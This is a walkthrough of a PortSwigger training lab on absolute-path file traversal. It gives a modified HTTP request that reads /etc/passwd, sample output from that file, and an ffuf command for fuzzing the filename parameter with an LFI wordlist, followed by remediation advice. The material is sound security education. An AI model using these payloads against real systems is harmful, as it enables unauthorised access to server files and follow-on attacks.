# Absolute Path Bypass  (PortSwigger Lab)

## File Inclusion Vulnerabilities - Lab Analysis

### **Lab: File Path Traversal - Absolute Path Bypass**

#### **Lab URL**

[PortSwigger Lab: File Path Traversal - Absolute Path Bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

***

### **Objective**

The goal of this lab is to exploit a **Path Traversal vulnerability** by bypassing directory traversal restrictions using absolute paths to retrieve the contents of the `/etc/passwd` file. This demonstrates how inadequate input validation allows attackers to access sensitive system files.

***

### **Understanding the Vulnerability**

* The web application dynamically includes files based on user input but does not properly validate the `filename` parameter.
* Instead of relying on directory traversal sequences (`../`), an attacker can attempt to reference files using absolute paths (e.g., `/etc/passwd`).
* This attack can be automated using tools like **Burp Suite** and **FFUF** to identify vulnerable endpoints and test different payloads.

***

### **Step-by-Step Solution**

#### **Step 1: Generate Traffic**

* Navigate to the lab and interact with the web application to identify how images are retrieved.
*   Look for a request similar to:

    ```plaintext
    GET /product?filename=7.jpeg HTTP/1.1
    Host: target-website.com
    ```
* The `filename` parameter is dynamically used to fetch an image file.

***

#### **Step 2: Intercept and Modify the Request**

* Open **Burp Suite** and enable **Intercept** mode.
* Capture the request containing the `filename` parameter.
*   Modify the `filename` parameter to directly reference an absolute path:

    ```plaintext
    GET /product?filename=/etc/passwd HTTP/1.1
    Host: target-website.com
    ```
* Forward the modified request and observe the response.

***

#### **Step 3: Verify Exploitation**

*   If successful, the server will return the contents of `/etc/passwd`, which includes system user information:

    ```plaintext
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    ```
* This confirms that the application is vulnerable to absolute path traversal, as it does not restrict direct file access.

***

### **Alternative Approach: Automating with FFUF**

1.  **Use FFUF to Identify File Inclusion Paths**:

    ```bash
    ffuf -u http://target.com/product?filename=FUZZ \
    -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
    -mc 200,301,302,307,401,500
    ```
2. **Analyze the Responses**:
   * Check for HTTP 200 responses containing sensitive file contents.
   * Identify patterns that indicate successful file retrieval.

***

### **Why This is an Example of Path Traversal**

#### **Characteristics of the Vulnerability**

1. **Unvalidated User Input**: The application allows user-controlled input in file paths without validation.
2. **Direct File Inclusion via Absolute Paths**: Instead of traversing directories (`../`), attackers can reference files using full system paths.
3. **Exploitation by Accessing System Files**: The attack retrieves sensitive system files, exposing potential security risks.

#### **Security Implications**

* **Information Disclosure**: Accessing `/etc/passwd` reveals system usernames, aiding further attacks such as brute-force logins.
* **Potential Remote Code Execution**: If an attacker can write to a file, they may escalate to executing arbitrary commands on the server.

***

### **Remediation Strategies**

1. **Sanitize User Input**
   * Implement strict validation to restrict file paths to allowed values.
   * Use an allowlist approach rather than a blocklist to prevent circumvention.
2. **Restrict File Access**
   * Limit access to specific directories using security mechanisms such as `open_basedir` in PHP.
   * Use application-level controls to prevent unauthorized file access.
3. **Monitor and Log Suspicious Requests**
   * Implement logging for file access attempts and analyze logs for anomalies.
   * Set up alerts for requests targeting system files like `/etc/passwd`.
4. **Use Secure File Inclusion Practices**
   * Hardcode file paths where possible instead of allowing dynamic input.
   * Prevent absolute path references by normalizing and resolving paths before inclusion.

***

### **Conclusion**

This lab demonstrates how failing to validate user input properly enables **Path Traversal via Absolute Paths**, allowing attackers to directly access restricted files. Effective input validation, strict access controls, and continuous monitoring are critical to mitigating this vulnerability. Organizations should proactively conduct security assessments to detect and address these risks before exploitation occurs.
